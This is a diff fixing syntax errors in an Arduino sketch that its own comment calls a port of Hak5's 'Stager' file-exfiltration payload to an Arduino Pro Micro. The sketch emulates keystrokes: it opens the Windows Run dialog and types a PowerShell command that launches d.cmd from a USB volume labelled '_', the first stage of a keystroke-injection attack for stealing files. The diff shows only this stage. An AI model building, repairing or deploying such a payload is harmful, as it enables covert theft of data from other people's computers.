@@ -1,4 +1,5 @@
-#include Keyboard.h
+#include <Keyboard.h>
+
 
 /*
  * This is a modified version of the Stager payload for file exfiltration by Hak5. This verison has been modified to run on an arduino pro micro instead of a USB rubber ducky, which makes it more accessible to the general population. 
@@ -21,7 +22,7 @@ void setup() {
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(200)
+  delay(200);
 
   Keyboard.print("powershell \".((gwmi win32_volume -f \'label=\'\'_\'\'\').Name+\'d.cmd')\"");
   Keyboard.press(KEY_RETURN);
